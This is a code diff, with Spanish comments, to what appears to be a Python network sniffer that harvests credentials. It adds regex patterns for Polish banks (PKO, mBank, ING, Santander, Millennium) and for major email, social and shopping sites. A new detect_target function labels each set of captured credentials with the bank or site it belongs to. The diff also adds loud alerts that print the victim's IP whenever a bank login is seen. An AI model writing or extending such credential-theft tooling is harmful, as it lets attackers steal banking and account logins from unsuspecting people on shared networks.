@@ -22,7 +22,37 @@ CREDENTIAL_PATTERNS = [
     (r'login[=:\s]+([^\s&;,\r\n]+)', 'login'),
 ]
 
+# Detección específica de bancos y sitios populares
+BANK_PATTERNS = {
+    '🏦 PKO': [r'pkobp\.pl', r'ipko\.pl', r'pko.*bank'],
+    '🏦 Santander': [r'santander.*\.pl', r'centrum24', r'santander.*online'],
+    '🏦 mBank': [r'mbank\.pl', r'online\.mbank', r'transakcyjny\.mbank'],
+    '🏦 ING': [r'ing\.pl', r'mojeing\.pl'],
+    '🏦 Millennium': [r'bankmillennium\.pl', r'millenet\.pl'],
+    '📧 Gmail': [r'accounts\.google\.com', r'gmail\.com', r'google.*login'],
+    '📧 Outlook': [r'outlook\.live\.com', r'login\.live\.com', r'outlook\.com'],
+    '📱 Facebook': [r'facebook\.com', r'fb\.com', r'm\.facebook'],
+    '📱 Instagram': [r'instagram\.com', r'ig\.me'],
+    '📱 WhatsApp': [r'web\.whatsapp\.com', r'whatsapp\.com'],
+    '📱 Twitter': [r'twitter\.com', r'x\.com'],
+    '💼 LinkedIn': [r'linkedin\.com', r'lnkd\.in'],
+    '🎮 Steam': [r'steampowered\.com', r'steamcommunity\.com'],
+    '🛒 Amazon': [r'amazon\.(com|pl|de|uk)', r'signin\.aws'],
+    '🛒 Allegro': [r'allegro\.pl', r'uzytkownik\.allegro'],
+}
+
 captured_credentials = []
+
+def detect_target(data_str):
+    """Detecta banco o sitio específico en el tráfico"""
+    data_lower = data_str.lower()
+    
+    for target_name, patterns in BANK_PATTERNS.items():
+        for pattern in patterns:
+            if re.search(pattern, data_lower, re.IGNORECASE):
+                return target_name
+    
+    return None
 
 def extract_credentials(data_str):
     """Extrae credenciales del payload"""
@@ -88,6 +118,9 @@ def pkt_callback(pkt):
         # Buscar credenciales
         creds = extract_credentials(data_str)
         
+        # Detectar target específico
+        target = detect_target(data_str)
+        
         if creds:
             entry = {
                 'timestamp': timestamp,
@@ -95,15 +128,24 @@ def pkt_callback(pkt):
                 'src_ip': src_ip,
                 'dst_ip': dst_ip,
                 'port': dst_port,
-                'credentials': creds
+                'credentials': creds,
+                'target': target if target else 'Desconocido'
             }
             captured_credentials.append(entry)
-            print(f"[{timestamp}] 🔥 {protocol} | {src_ip} → {dst_ip}:{dst_port}")
+            
+            # Alerta especial para bancos
+            alert = f"[{timestamp}] 🔥 {protocol} | {src_ip} → {dst_ip}:{dst_port}"
+            if target:
+                alert = f"[{timestamp}] 🔥🔥🔥 {target} DETECTADO | {src_ip}"
+            
+            print(alert)
             print(f"          Credenciales: {creds}")
             save_credentials()
         
-        # Log de paquetes sospechosos
-        if any(keyword in data_str.lower() for keyword in ['login', 'password', 'user', 'email', 'auth']):
+        # Log de paquetes sospechosos con target
+        elif target:
+            print(f"[{timestamp}] 👁️  {target} visitado | {src_ip}")
+        elif any(keyword in data_str.lower() for keyword in ['login', 'password', 'user', 'email', 'auth']):
             print(f"[{timestamp}] 📡 {protocol} | {src_ip} → {dst_ip}:{dst_port} | Sospechoso")
 
 def main():
